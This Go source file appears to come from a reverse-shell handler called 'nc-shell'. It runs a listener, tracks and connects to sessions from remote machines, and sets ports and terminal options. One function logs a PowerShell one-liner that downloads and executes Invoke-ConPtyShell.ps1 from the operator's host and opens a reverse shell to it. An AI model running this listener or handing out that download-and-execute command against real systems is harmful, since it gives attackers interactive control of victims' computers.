package sessions

import (
	"fmt"
	"nc-shell/src/terminal"
	"os"
	"sort"
	"strconv"

	logging "github.com/op/go-logging"
)

// OptionsSession contains the option of the futur terminal and the listener
var OptionsSession terminal.Options

// PrintSessions will list all active sessions
func PrintSessions() {
	// Tricks to print the map ordered by ID
	keys := make([]int, 0, len(sessions))
	for k := range sessions {
		keys = append(keys, k)
	}
	sort.Ints(keys)
	for _, id := range keys {
		terminal := sessions[id]
		fmt.Println(strconv.Itoa(id) + " => " + terminal.OS + " " + terminal.Con.RemoteAddr().String())
	}
}

// Connect to a session ID
func Connect(idString string) {
	if ok, id := sessionIDExists(idString); ok {
		status := sessions[id].Connect()
		// if session is terminated
		if status == 0 {
			delete(sessions, id)
		}
	} else {
		log.Error("Session " + idString + " invalid or not found")
	}
}

// Start the listener
func Start() {
	localPort := ":" + strconv.Itoa(OptionsSession.Port)
	if term.Listener == nil {
		go newTerminals()
		log.Notice("Listening on", localPort)
	} else {
		log.Notice("Already listening on " + localPort)
	}
}

// Stop the listener
func Stop() {
	if term.Listener != nil {
		if err := term.Listener.Close(); err != nil {
			term.Log.Error("Unable to close the listener " + err.Error())
		}
	}
	term.Listener = nil
}

// Restart the listener
func Restart() {
	Stop()
	Start()
}

// SetDebug update the option Debug
func SetDebug(debugString string) {
	if debug, err := strconv.ParseBool(debugString); err == nil {
		OptionsSession.Debug = debug
		PrintDebugOptions()
		Logger()
	} else {
		log.Error("Debug option " + debugString + " invalid")
	}
}

// SetPort update the option Port
func SetPort(portString string) {
	if port, err := strconv.Atoi(portString); err == nil {
		OptionsSession.Port = port
		PrintPortOptions()
	} else {
		log.Error("Port option " + portString + " invalid")
	}
}

// SetDisableConPTY update the option DisableConPTY
func SetDisableConPTY(disableConPTYString string) {
	if disableConPTY, err := strconv.ParseBool(disableConPTYString); err == nil {
		OptionsSession.DisableConPTY = disableConPTY
		PrintDisableConPTYOptions()
	} else {
		log.Error("DisableConPTY option " + disableConPTYString + " invalid")
	}
}

// SetOnlyWebserver update the option OnlyWebserver
func SetOnlyWebserver(onlyWebserverString string) {
	if onlyWebserver, err := strconv.ParseBool(onlyWebserverString); err == nil {
		OptionsSession.OnlyWebserver = onlyWebserver
		PrintOnlyWebserverOptions()
		// If OnlyWebServer is enable we print the oneliner
		if onlyWebserver {
			log.Info("connect with: powershell IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell yourIP " + strconv.Itoa(OptionsSession.Port))
		}
		Restart()
	} else {
		log.Error("OnlyWebserver option " + onlyWebserverString + " invalid")
	}
}

// PrintDebugOptions print the value of Debug options
func PrintDebugOptions() {
	fmt.Println("Debug => " + strconv.FormatBool(OptionsSession.Debug))
}

// PrintPortOptions print the value of Port options
func PrintPortOptions() {
	fmt.Println("Port => " + strconv.Itoa(OptionsSession.Port))
}

// PrintDisableConPTYOptions print the value of DisableConPTY options
func PrintDisableConPTYOptions() {
	fmt.Println("DisableConPTY => " + strconv.FormatBool(OptionsSession.DisableConPTY))
}

// PrintDisableConPTYOptions print the value of DisableConPTY options
func PrintOnlyWebserverOptions() {
	fmt.Println("OnlyWebserver => " + strconv.FormatBool(OptionsSession.OnlyWebserver))
}

// PrintOptions print the current options for the terminal
func PrintOptions() {
	PrintDebugOptions()
	PrintPortOptions()
	PrintDisableConPTYOptions()
	PrintOnlyWebserverOptions()
}

// Logger configure the logger of the application
func Logger() {
	log = logging.MustGetLogger("nc-shell")

	logger := logging.NewLogBackend(os.Stderr, "", 0)
	var loggerLeveled logging.LeveledBackend

	if OptionsSession.Debug {
		// \033[999 trick to reset the position of the cursor when the terminal is with stty raw -echo
		var format = logging.MustStringFormatter(
			"\033[999D%{color}%{time:15:04:05.000} %{longpkg} ▶ %{level} %{message} %{color:reset}",
		)
		loggerFormatter := logging.NewBackendFormatter(logger, format)
		loggerLeveled = logging.AddModuleLevel(loggerFormatter)
		loggerLeveled.SetLevel(logging.DEBUG, "")
	} else {
		var format = logging.MustStringFormatter(
			`%{color}%{time:15:04:05} %{color:reset} %{message}`,
		)

		loggerFormatter := logging.NewBackendFormatter(logger, format)
		loggerLeveled = logging.AddModuleLevel(loggerFormatter)
		loggerLeveled.SetLevel(logging.INFO, "")
	}

	// Set the backends to be used.
	logging.SetBackend(loggerLeveled)

}
